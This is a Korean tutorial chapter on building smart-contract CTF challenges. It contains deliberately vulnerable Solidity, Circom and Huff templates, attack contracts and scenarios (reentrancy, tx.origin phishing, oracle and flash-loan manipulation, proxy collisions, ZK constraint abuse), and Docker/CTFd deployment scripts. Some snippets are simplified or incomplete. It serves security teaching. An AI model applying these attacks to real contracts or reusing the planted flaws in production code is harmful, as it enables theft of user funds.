# Phase 10: CTF 문제 제작

## 개요

CTF 문제를 제작하는 것은 취약점을 소비하는 것에서 생산하는 단계로의 전환이다. 좋은 문제를 만들기 위해서는 공격자 관점과 설계자 관점을 동시에 가져야 하며, 참가자가 특정 개념을 자연스럽게 학습하도록 유도하는 교육 설계 능력이 필요하다. 이 챕터는 문제 설계 원칙부터 실제 코드 템플릿, 배포 인프라까지 CTF 문제 제작의 전 과정을 다룬다.

---

## 1. 문제 설계 5원칙

### 원칙 1: 단일 핵심 개념 (Single Core Concept)

좋은 CTF 문제는 하나의 핵심 취약점 또는 개념을 가르친다. 여러 취약점을 중첩시키는 것은 난이도를 높이는 방법이 될 수 있지만, 각 레이어가 독립적으로 의미를 가져야 한다.

```
나쁜 예: 재진입 + 오버플로우 + 서명 위조를 동시에 요구
좋은 예: 재진입만 요구하되, 트릭은 cross-function 형태로 변형
```

### 원칙 2: 명확한 승리 조건 (Clear Win Condition)

`isSolved()` 함수 또는 플래그 취득 조건이 명확해야 한다. 참가자가 무엇을 달성해야 하는지 모호하면 안 된다.

```solidity
// 좋은 승리 조건 예시
function isSolved() external view returns (bool) {
    return token.balanceOf(address(vault)) == 0;
}

// 나쁜 예: 여러 조건이 불명확하게 얽힌 경우
function isSolved() external view returns (bool) {
    return someFlag && anotherCondition && msg.sender == owner;
}
```

### 원칙 3: 의도된 풀이 경로 (Intended Solution Path)

문제 제작자는 반드시 의도된 풀이를 구현하고 테스트해야 한다. 또한 의도하지 않은 풀이(unintended solution)를 최대한 차단해야 한다.

```
의도하지 않은 풀이 차단 방법:
- selfdestruct로 ETH 강제 전송 차단: require(address(this).balance == expectedBalance)
- 빈 컨트랙트로 extcodesize 우회 차단: 생성자 내 실행 여부 체크
- 관리자 함수 초기화 완료 확인
```

### 원칙 4: 적절한 힌트 계층 (Tiered Hints)

대회 형식에 따라 힌트를 계층화한다:
- 레벨 1: 문제 설명에서 암시
- 레벨 2: 코드 주석으로 방향 제시
- 레벨 3: 명시적 힌트 공개 (시간 경과 또는 요청 시)

### 원칙 5: 테스트 가능성 (Testability)

문제를 제출 전 최소 3명의 베타 테스터가 풀어보아야 한다. 풀이 시간이 예상 범위를 크게 벗어나면 난이도 조정이 필요하다.

```
Easy: 15-30분
Medium: 30-90분
Hard: 90분-4시간
Expert: 4시간 이상 (팀 협력 필요)
```

---

## 2. 난이도별 문제 유형 및 코드 템플릿

### 2.1 Easy 문제 (기초 개념 확인)

#### Easy-1: Storage Secret

**개념**: private 변수는 온체인에서 읽을 수 있다.
**예상 풀이 시간**: 10-20분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract StorageSecret {
    // private이지만 온체인에서 읽을 수 있다
    bytes32 private secret;
    bool public solved;

    constructor(bytes32 _secret) {
        secret = _secret;
    }

    function unlock(bytes32 _guess) external {
        require(_guess == secret, "Wrong secret");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}

// 풀이
// cast storage <contract_address> 0 --rpc-url $RPC
// => 슬롯 0에 secret 값이 저장되어 있음
```

**Setup 컨트랙트**:
```solidity
contract StorageSecretSetup is Test {
    StorageSecret target;

    function setUp() public {
        bytes32 secret = keccak256("supersecret");
        target = new StorageSecret(secret);
    }

    function testSolve() public {
        // 참가자 솔루션
        bytes32 secret = vm.load(address(target), bytes32(0));
        target.unlock(secret);
        assertTrue(target.isSolved());
    }
}
```

---

#### Easy-2: Origin Check

**개념**: tx.origin과 msg.sender의 차이.
**예상 풀이 시간**: 15-25분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract OriginCheck {
    address public owner;
    uint256 public balance;
    bool public drained;

    constructor() payable {
        owner = msg.sender;
        balance = msg.value;
    }

    // tx.origin을 사용하여 소유자 확인 - 취약점!
    function withdraw() external {
        require(tx.origin == owner, "Not owner");
        uint256 amount = balance;
        balance = 0;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        drained = true;
    }

    function isSolved() external view returns (bool) {
        return drained && address(this).balance == 0;
    }
}

// 공격 컨트랙트
contract OriginAttack {
    OriginCheck target;
    address owner;

    constructor(address _target) {
        target = OriginCheck(_target);
        owner = msg.sender;
    }

    // 피해자(owner)가 이 함수를 호출하도록 유도
    function phish() external {
        target.withdraw(); // tx.origin은 여전히 owner
    }

    receive() external payable {
        payable(owner).transfer(address(this).balance);
    }
}
```

---

#### Easy-3: Fallback Takeover

**개념**: fallback() / receive() 함수를 통한 소유권 탈취.
**예상 풀이 시간**: 15-20분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FallbackTakeover {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        contributions[msg.sender] = 1000 ether;
    }

    function contribute() external payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }
}
```

---

#### Easy-4: Integer Underflow

**개념**: Solidity 0.8 이전 정수 언더플로우.
**예상 풀이 시간**: 20-30분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // 의도적으로 오래된 버전 사용

contract TokenUnderflow {
    mapping(address => uint256) public balances;

    constructor() public {
        balances[msg.sender] = 0; // 시작 잔액 없음
    }

    function transfer(address to, uint256 amount) public {
        // SafeMath 없음 - 언더플로우 가능!
        require(balances[msg.sender] - amount >= 0);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function isSolved() external view returns (bool) {
        return balances[msg.sender] >= 1000000 ether;
    }
}

// 풀이: 잔액 0에서 1 전송 → 언더플로우로 2^256-1 획득
```

---

#### Easy-5: Coin Flip Prediction

**개념**: 블록해시 기반 온체인 랜덤은 예측 가능하다.
**예상 풀이 시간**: 25-35분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 private lastHash;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool guess) external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(blockValue != lastHash, "Same block");
        lastHash = blockValue;

        bool side = (blockValue / FACTOR) == 1;
        if (side == guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    function isSolved() external view returns (bool) {
        return consecutiveWins >= 10;
    }
}

// 공격 컨트랙트
contract CoinFlipAttack {
    CoinFlip target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = (blockValue / FACTOR) == 1;
        target.flip(guess);
    }
}
```

---

### 2.2 Medium 문제 (복합 개념 응용)

#### Medium-1: Reentrancy Vault

**개념**: CEI(Checks-Effects-Interactions) 패턴 위반.
**예상 풀이 시간**: 30-60분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyVault {
    IERC20 public token;
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        totalDeposits += amount;
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient balance");
        // 취약점: 외부 호출 후 상태 업데이트
        (bool ok,) = msg.sender.call(
            abi.encodeWithSignature("onTokenWithdraw(uint256)", amount)
        );
        if (!ok) {
            // ERC20 전송으로 폴백
            token.transfer(msg.sender, amount);
        }
        deposits[msg.sender] -= amount; // 너무 늦은 상태 업데이트
        totalDeposits -= amount;
    }

    function isSolved() external view returns (bool) {
        return token.balanceOf(address(this)) == 0 &&
               totalDeposits == 0;
    }
}

// 공격 컨트랙트
contract ReentrancyAttack {
    ReentrancyVault vault;
    IERC20 token;
    uint256 attackAmount;

    constructor(address _vault, address _token) {
        vault = ReentrancyVault(_vault);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        token.approve(address(vault), amount);
        vault.deposit(amount);
        vault.withdraw(amount);
    }

    function onTokenWithdraw(uint256 amount) external {
        if (token.balanceOf(address(vault)) >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
```

---

#### Medium-2: Delegatecall Confusion

**개념**: delegatecall의 스토리지 컨텍스트 혼동.
**예상 풀이 시간**: 45-75분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Logic {
    // 슬롯 0
    address public owner;

    function setOwner(address newOwner) external {
        owner = newOwner;
    }
}

contract Proxy {
    // 슬롯 0 - Logic의 owner와 충돌!
    address public implementation;
    // 슬롯 1
    address public admin;

    constructor(address _impl) {
        implementation = _impl;
        admin = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function isSolved() external view returns (bool) {
        return admin == tx.origin;
    }
}

// 풀이:
// Logic.setOwner(attackerAddress) → Proxy의 슬롯 0(implementation) 덮어씀
// 이후 implementation을 공격자 컨트랙트로 교체
// 그 다음 delegatecall로 admin(슬롯 1) 변경
```

---

#### Medium-3: Flash Loan Oracle

**개념**: 플래시론을 이용한 AMM 현물 가격 조작.
**예상 풀이 시간**: 60-90분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISimpleDex {
    function getPrice(address token) external view returns (uint256);
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}

contract VulnerableLending {
    ISimpleDex public oracle;
    IERC20 public collateral;
    IERC20 public borrowToken;
    mapping(address => uint256) public collateralDeposited;
    mapping(address => uint256) public borrowed;

    uint256 public constant COLLATERAL_FACTOR = 150; // 150%

    constructor(address _oracle, address _collateral, address _borrow) {
        oracle = ISimpleDex(_oracle);
        collateral = IERC20(_collateral);
        borrowToken = IERC20(_borrow);
    }

    function depositCollateral(uint256 amount) external {
        collateral.transferFrom(msg.sender, address(this), amount);
        collateralDeposited[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = collateralDeposited[msg.sender]
            * oracle.getPrice(address(collateral)) / 1e18;
        uint256 borrowValue = (borrowed[msg.sender] + amount)
            * oracle.getPrice(address(borrowToken)) / 1e18;

        require(collateralValue * 100 >= borrowValue * COLLATERAL_FACTOR);
        borrowed[msg.sender] += amount;
        borrowToken.transfer(msg.sender, amount);
    }

    function isSolved() external view returns (bool) {
        return borrowToken.balanceOf(address(this)) == 0;
    }
}

// 공격 시나리오:
// 1. 플래시론으로 대량의 collateral 토큰 빌림
// 2. DEX에서 collateral 대량 매도 → 가격 급락
// 3. 저가에 collateral 구매 + 담보 제공
// 4. borrow()로 과도하게 차입 (오라클이 조작된 낮은 가격 반영)
// 5. 플래시론 상환
```

---

#### Medium-4: Signature Replay

**개념**: 서명 재사용 공격 (nonce 또는 chainId 누락).
**예상 풀이 시간**: 45-70분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract VulnerableMultisig {
    using ECDSA for bytes32;

    address[2] public signers;
    uint256 public balance;

    constructor(address signer1, address signer2) payable {
        signers[0] = signer1;
        signers[1] = signer2;
        balance = msg.value;
    }

    function execute(
        address to,
        uint256 amount,
        bytes memory sig1,
        bytes memory sig2
    ) external {
        // 취약점: nonce 없음, chainId 없음, 서명 재사용 가능
        bytes32 hash = keccak256(abi.encodePacked(to, amount));
        bytes32 ethHash = hash.toEthSignedMessageHash();

        require(ethHash.recover(sig1) == signers[0], "Bad sig1");
        require(ethHash.recover(sig2) == signers[1], "Bad sig2");

        balance -= amount;
        (bool ok,) = to.call{value: amount}("");
        require(ok);
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }
}

// 풀이: 첫 번째 정당한 트랜잭션의 서명을 캡처 후 동일 서명으로 재호출
```

---

#### Medium-5: Governance Flash Attack

**개념**: 플래시론으로 거버넌스 투표권 일시 획득.
**예상 풀이 시간**: 60-90분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGovernanceToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function flashLoan(address, uint256, bytes calldata) external;
}

contract VulnerableGovernance {
    IGovernanceToken public token;
    uint256 public totalSupply;
    mapping(bytes32 => bool) public executed;

    constructor(address _token, uint256 _totalSupply) {
        token = IGovernanceToken(_token);
        totalSupply = _totalSupply;
    }

    // 취약점: 현재 잔액으로 즉시 투표 (스냅샷 없음)
    function execute(
        address target,
        bytes calldata data,
        bytes32 proposalId
    ) external {
        require(!executed[proposalId]);
        require(
            token.balanceOf(msg.sender) * 100 / totalSupply >= 51,
            "Need majority"
        );
        executed[proposalId] = true;
        (bool ok,) = target.call(data);
        require(ok);
    }

    function isSolved() external view returns (bool) {
        // 예: treasury가 비워졌는지
        return address(this).balance == 0;
    }

    receive() external payable {}
}
```

---

### 2.3 Hard 문제 (심화 취약점)

#### Hard-1: Read-Only Reentrancy

**개념**: view 함수 내에서 발생하는 재진입으로 오라클 조작.
**예상 풀이 시간**: 90-180분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Curve-style 풀 (단순화)
contract StablePool {
    uint256[] public balances;
    uint256 public totalSupply;
    address[] public tokens;

    constructor(address[] memory _tokens) payable {
        tokens = _tokens;
        balances = new uint256[](_tokens.length);
    }

    // 가격 계산 (view) - 재진입 중에는 잘못된 값 반환
    function getVirtualPrice() external view returns (uint256) {
        uint256 totalValue = 0;
        for (uint i = 0; i < balances.length; i++) {
            totalValue += balances[i];
        }
        if (totalSupply == 0) return 1e18;
        return totalValue * 1e18 / totalSupply;
    }

    function removeLiquidity(uint256 lpAmount, uint256[] calldata minAmounts) external {
        uint256 share = lpAmount * 1e18 / totalSupply;

        // 취약점: totalSupply 먼저 감소, 잔액은 나중에 감소
        totalSupply -= lpAmount;

        for (uint i = 0; i < tokens.length; i++) {
            uint256 amount = balances[i] * share / 1e18;
            balances[i] -= amount;
            // ETH 전송 시 콜백 발생 → 이 시점에서 getVirtualPrice() 호출 시 비정상
            IERC20(tokens[i]).transfer(msg.sender, amount);
        }
    }
}

// 의존 오라클
contract VulnerableOracle {
    StablePool pool;

    function getPrice() external view returns (uint256) {
        return pool.getVirtualPrice(); // 재진입 중 잘못된 값
    }
}

// 이 오라클에 의존하는 대출 프로토콜이 공격 대상
```

---

#### Hard-2: ERC4626 Inflation Attack

**개념**: 공유 인플레이션 공격으로 예금자 자산 탈취.
**예상 풀이 시간**: 120-180분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

// 취약한 볼트: 최소 초기 공유 보호 없음
contract VulnerableVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) ERC20("Vault", "vTKN") {}

    // convertToShares 오버라이드 없음 → 기본 구현 사용
    // 기본 구현: shares = assets * totalSupply / totalAssets
    // totalSupply == 0이면 shares = assets (1:1)
}

// 공격 시나리오:
// 1. 공격자: 1 wei 예금 → 1 share 획득
// 2. 공격자: 볼트에 1000e18 토큰 직접 transfer (donate)
//    → totalAssets = 1000e18 + 1, totalSupply = 1
//    → convertToShares(1000e18) = 1000e18 * 1 / (1000e18 + 1) = 0 !!!
// 3. 피해자: 1000e18 예금 → 0 shares 획득
// 4. 공격자: 1 share 소각 → 전체 자산 회수

// 방어: ERC4626의 _decimalsOffset() 또는 초기 최소 공유 소각
```

---

#### Hard-3: Proxy Storage Collision

**개념**: 프록시와 구현 컨트랙트 간 스토리지 슬롯 충돌.
**예상 풀이 시간**: 120-240분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 취약한 업그레이드 가능 지갑
contract WalletProxy {
    // 슬롯 0: 소유자 (취약점의 핵심)
    address public owner;
    // 슬롯 1: 구현체 주소
    address public implementation;

    constructor(address _impl) {
        owner = msg.sender;
        implementation = _impl;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function upgradeTo(address newImpl) external onlyOwner {
        implementation = newImpl;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract WalletLogic {
    // 슬롯 0: pendingOwner (프록시의 owner와 충돌!)
    address public pendingOwner;
    // 슬롯 1: ... (프록시의 implementation과 충돌!)
    address public something;

    function setPendingOwner(address newOwner) external {
        pendingOwner = newOwner; // 실제로는 프록시의 owner를 덮어씀
    }

    function drain(address payable to) external {
        // pendingOwner == owner이면 (슬롯 0 충돌 이후)
        require(pendingOwner == msg.sender || something == msg.sender);
        to.transfer(address(this).balance);
    }
}

// 풀이:
// 1. WalletLogic.setPendingOwner(attacker) 호출 (delegatecall)
//    → 실제로 WalletProxy.owner = attacker 로 변경
// 2. WalletProxy.upgradeTo(maliciousImpl) 호출 (이제 owner니까 가능)
// 3. maliciousImpl에서 모든 자금 drain
```

---

#### Hard-4: TWAP Manipulation

**개념**: 짧은 TWAP 기간의 오라클 조작.
**예상 풀이 시간**: 180-300분

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

contract ShortTWAPOracle {
    IUniswapV3Pool public pool;
    uint32 public constant TWAP_PERIOD = 300; // 5분 - 너무 짧음!

    constructor(address _pool) {
        pool = IUniswapV3Pool(_pool);
    }

    function getTWAP() external view returns (uint256 price) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD;
        secondsAgos[1] = 0;

        (int56[] memory tickCumulatives,) = pool.observe(secondsAgos);

        int56 tickDiff = tickCumulatives[1] - tickCumulatives[0];
        int24 avgTick = int24(tickDiff / int56(uint56(TWAP_PERIOD)));

        price = _tickToPrice(avgTick);
    }

    function _tickToPrice(int24 tick) internal pure returns (uint256) {
        // 1.0001^tick * 1e18
        // 실제 구현은 TickMath 라이브러리 사용
        return uint256(uint24(tick)) * 1e14; // 단순화
    }
}

// 공격: 여러 블록에 걸쳐 큰 포지션으로 가격 왜곡 후 취약한 프로토콜 공격
// Anvil에서 block.timestamp 조작으로 테스트 가능:
// vm.warp(block.timestamp + 300);
// vm.roll(block.number + 25);
```

---

### 2.4 Expert 문제 (전문가 수준)

#### Expert-1: Cross-Chain Message Forgery

**개념**: L2→L1 메시지 검증 우회.
**예상 풀이 시간**: 4-8시간 (팀 권장)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// L1에서 L2 메시지를 받는 브리지 (단순화)
contract L1Bridge {
    address public l2Messenger;
    mapping(bytes32 => bool) public processedMessages;
    mapping(address => uint256) public balances;

    constructor(address _l2Messenger) {
        l2Messenger = _l2Messenger;
    }

    // 취약점: 메시지 발신자 검증이 불완전
    function finalizeWithdrawal(
        address recipient,
        uint256 amount,
        bytes32 messageHash,
        bytes calldata proof
    ) external {
        require(!processedMessages[messageHash], "Already processed");
        // 취약점: proof 검증이 불완전하거나 누락
        require(_verifyProof(messageHash, proof), "Invalid proof");

        processedMessages[messageHash] = true;
        balances[recipient] += amount;
    }

    function _verifyProof(bytes32 hash, bytes calldata proof) internal view returns (bool) {
        // 취약한 구현: 단순 서명 검증만 수행
        // 실제로는 Merkle proof 검증 + 상태 루트 확인 필요
        if (proof.length == 0) return false;
        address signer = recoverSigner(hash, proof);
        return signer == l2Messenger; // l2Messenger 주소를 알면 위조 가능?
    }

    function recoverSigner(bytes32 hash, bytes memory sig) internal pure returns (address) {
        // 취약점: EIP-191 prefix 없이 복원 → 다른 서명 재사용 가능
        bytes32 r; bytes32 s; uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        return ecrecover(hash, v, r, s);
    }

    function isSolved() external view returns (bool) {
        return balances[tx.origin] >= 1000 ether;
    }
}
```

---

## 3. Consensus Layer CTF 문제

### 3.1 Beacon Chain 관련 문제 아이디어

**문제: Validator Slashing Proof**
```
배경: 검증자가 동일 슬롯에서 두 개의 다른 블록에 서명 (이중서명)
목표: 올바른 slashing proof를 구성하여 제출
학습: BLS 서명, 비콘체인 상태, attestation 구조
```

**문제: Withdrawal Credential Confusion**
```
배경: 0x00 vs 0x01 인출 자격증명 형식 혼동
목표: 잘못 설정된 인출 자격증명을 업데이트
학습: EIP-7002, 자격증명 마이그레이션
```

**문제: MEV Bundle Manipulation**
```
배경: 잘못 구성된 MEV 번들에서 이익 추출
목표: 블록 내 트랜잭션 순서 조작 시뮬레이션
도구: Flashbots SUAVE 환경
```

### 3.2 간단한 Consensus 시뮬레이션 CTF

```python
# Python으로 구현하는 간단한 합의 레이어 CTF
# eth2-sim 또는 직접 구현

class BeaconState:
    def __init__(self):
        self.validators = []
        self.balances = []
        self.slot = 0

    def process_attestation(self, attestation):
        # 취약점: 집계 서명 검증 누락
        # 공격: 서명 없이 attestation 삽입
        pass

    def process_deposit(self, deposit):
        # 취약점: Merkle proof 재사용
        pass
```

---

## 4. ZK CTF 문제

### 4.1 ZK 증명 위조 문제

#### ZK-1: Weak Constraint

**개념**: Circom 회로에서 제약 조건 누락으로 허위 증명 생성.

```circom
// 취약한 회로 예시
pragma circom 2.0.0;

template VulnerableAge() {
    signal input age;
    signal input secret;
    signal output isAdult;

    // 취약점: age가 18 이상임을 증명하지만
    // age가 음수나 매우 큰 값인 경우 체크 없음
    component isGte = GreaterEqThan(8);
    isGte.in[0] <== age;
    isGte.in[1] <== 18;
    isAdult <== isGte.out;

    // 누락된 제약: 0 <= age <= 150 범위 체크
    // 필드 원소 크기(~2^254)에서 18을 빼면 GTE 조건 충족
}

component main = VulnerableAge();
```

```javascript
// 공격: age = p - 1 (필드 크기 - 1) → 18보다 크게 보임
const { proof, publicSignals } = await groth16.fullProve(
    { age: FIELD_SIZE - 1n, secret: 12345n },
    "circuit.wasm",
    "circuit_final.zkey"
);
```

---

#### ZK-2: Verifier Bypass

**개념**: Solidity 검증자 컨트랙트의 잘못된 구현.

```solidity
// 취약한 ZK 검증자
contract VulnerableVerifier {
    // Groth16 검증 (단순화)
    function verify(
        uint[2] calldata a,
        uint[2][2] calldata b,
        uint[2] calldata c,
        uint[1] calldata input
    ) external view returns (bool) {
        // 취약점: 포인트가 올바른 곡선 위에 있는지 확인하지 않음
        // 취약점: 입력값 범위 확인 없음
        // BN254 필드 크기 체크 누락
        return _verifyProof(a, b, c, input);
    }

    function _verifyProof(...) internal view returns (bool) {
        // precompile 호출 시 입력 검증 미흡
        // ecAdd, ecMul, ecPairing precompile
    }

    function isSolved(uint[1] calldata input) external view returns (bool) {
        // input[0]이 특정 값이면 해결
        return input[0] == 1;
    }
}
```

---

#### ZK-3: Trusted Setup Exploit

**개념**: 신뢰할 수 없는 설정(toxic waste 노출)으로 허위 증명 생성.

```
배경:
- 회로의 신뢰 설정에서 toxic waste (τ, α, β 등)가 노출됨
- 이 값들을 알면 임의의 명령문에 대한 증명 생성 가능

목표:
- 제공된 toxic waste를 사용하여 거짓 명령문 증명
- 예: "나는 42의 제곱근을 안다" (42는 완전 제곱수가 아님)

도구: snarkjs, circom
```

---

## 5. 기술 스택

### 5.1 Foundry (문제 제작 핵심 도구)

```bash
# CTF 문제 프로젝트 구조
ctf-challenge/
├── src/
│   ├── Challenge.sol          # 문제 컨트랙트
│   └── Setup.sol              # 환경 설정 컨트랙트
├── test/
│   ├── Challenge.t.sol        # 문제 검증 테스트
│   └── Solution.t.sol         # 의도된 풀이 (비공개)
├── script/
│   └── Deploy.s.sol           # 배포 스크립트
├── foundry.toml
└── README.md

# foundry.toml 설정
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc_version = "0.8.20"
optimizer = true
optimizer_runs = 200

[profile.ctf]
ffi = true  # 외부 프로세스 실행 허용
```

**Setup 컨트랙트 패턴**:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Challenge.sol";

contract Setup {
    Challenge public challenge;
    bool public solved;

    constructor() payable {
        // 문제 초기화
        challenge = new Challenge{value: 10 ether}();
    }

    function isSolved() external returns (bool) {
        solved = challenge.isSolved();
        return solved;
    }
}
```

---

### 5.2 Huff (저수준 문제 제작)

```huff
// 취약한 저금통 Huff 구현
#define macro MAIN() = takes(0) returns(0) {
    // calldata[0:4] = 함수 선택자
    0x00 calldataload 0xe0 shr  // [selector]

    // deposit()
    dup1 0xd0e30db0 eq deposit jumpi
    // withdraw()
    dup1 0x2e1a7d4d eq withdraw jumpi

    0x00 0x00 revert

    deposit:
        // 잔액 업데이트
        caller          // [caller]
        0x00 sload      // [balance_slot_value, caller]
        callvalue add   // [new_balance, caller]
        // 취약점: 슬롯 계산 없이 그냥 슬롯 0에 저장
        0x00 sstore     // []
        stop

    withdraw:
        // 취약점: msg.sender 잔액만 확인, 총 잔액 체크 없음
        0x00 sload      // [stored_balance]
        dup1 0x00 lt    // [balance < 0, stored_balance]  ← 불가능하지만
        revert_jump jumpi

        0x00 0x00 sstore  // 잔액 0으로
        caller 0x00 0x00 0x00 0x00 gas call
        stop

    revert_jump:
        0x00 0x00 revert
}
```

---

### 5.3 Python (서버사이드 문제 및 ZK 도구)

```python
# CTF 서버 (nc로 연결하는 방식)
import asyncio
from web3 import Web3
from eth_account import Account

class CTFServer:
    def __init__(self, rpc_url: str, private_key: str):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.deployer = Account.from_key(private_key)

    async def handle_connection(self, reader, writer):
        # 새 인스턴스 배포
        contract = await self.deploy_challenge()
        writer.write(f"Challenge deployed: {contract.address}\n".encode())

        # 풀이 확인 대기
        while True:
            data = await reader.read(100)
            if data.strip() == b"isSolved":
                result = contract.functions.isSolved().call()
                writer.write(f"{result}\n".encode())
                if result:
                    flag = self.get_flag()
                    writer.write(f"FLAG: {flag}\n".encode())
                    break

    async def deploy_challenge(self):
        # 컨트랙트 배포 로직
        pass

    def get_flag(self) -> str:
        return "CTF{r34l_fl4g_h3r3}"

async def main():
    server = CTFServer(
        rpc_url="http://localhost:8545",
        private_key="0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
    )
    srv = await asyncio.start_server(
        server.handle_connection, "0.0.0.0", 1337
    )
    async with srv:
        await srv.serve_forever()

asyncio.run(main())
```

---

### 5.4 Docker 배포

```dockerfile
# Dockerfile
FROM ghcr.io/foundry-rs/foundry:latest

WORKDIR /app
COPY . .

RUN forge build

# Anvil 노드 + 자동 배포
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 8545 1337

ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/bin/bash
# entrypoint.sh

# Anvil 시작 (백그라운드)
anvil \
    --host 0.0.0.0 \
    --port 8545 \
    --accounts 10 \
    --balance 10000 \
    --block-time 1 \
    --chain-id 31337 \
    --mnemonic "test test test test test test test test test test test junk" &

sleep 2

# 컨트랙트 배포
forge script script/Deploy.s.sol \
    --rpc-url http://localhost:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
    --broadcast

# 풀이 서버 시작
python3 server.py
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  challenge:
    build: .
    ports:
      - "8545:8545"  # Anvil RPC
      - "1337:1337"  # CTF 서버
    environment:
      - FLAG=CTF{example_flag_here}
    restart: unless-stopped
```

---

### 5.5 CTFd (CTF 플랫폼)

```bash
# CTFd 설치 및 실행
git clone https://github.com/CTFd/CTFd.git
cd CTFd
pip install -r requirements.txt

# 설정
cp .env.example .env
# .env 편집: SECRET_KEY, DATABASE_URL 등

# 실행
python serve.py

# Docker로 실행
docker-compose up -d
```

**문제 등록 자동화 스크립트**:
```python
import requests

CTFd_URL = "https://ctf.example.com"
API_TOKEN = "your_api_token"

def create_challenge(
    name: str,
    category: str,
    description: str,
    value: int,
    flag: str,
    difficulty: str
):
    headers = {"Authorization": f"Token {API_TOKEN}"}

    # 문제 생성
    challenge_data = {
        "name": name,
        "category": category,
        "description": description,
        "value": value,
        "state": "hidden",
        "type": "standard"
    }
    resp = requests.post(
        f"{CTFd_URL}/api/v1/challenges",
        json=challenge_data,
        headers=headers
    )
    challenge_id = resp.json()["data"]["id"]

    # 플래그 추가
    flag_data = {
        "challenge_id": challenge_id,
        "content": flag,
        "type": "static"
    }
    requests.post(
        f"{CTFd_URL}/api/v1/flags",
        json=flag_data,
        headers=headers
    )

    return challenge_id
```

---

## 6. 문제 검증 체크리스트

### 6.1 기술 검증

```
컨트랙트 검증:
□ 컴파일 오류 없음 (forge build)
□ 의도된 풀이가 테스트로 통과됨 (forge test)
□ 의도하지 않은 풀이 차단 확인
□ 가스 한도 내 실행 가능
□ 포크 모드 필요 시 올바른 블록 번호 지정

Docker 검증:
□ docker build 성공
□ docker run 후 포트 접근 가능
□ Anvil 노드 정상 동작
□ 배포 스크립트 멱등성 확인

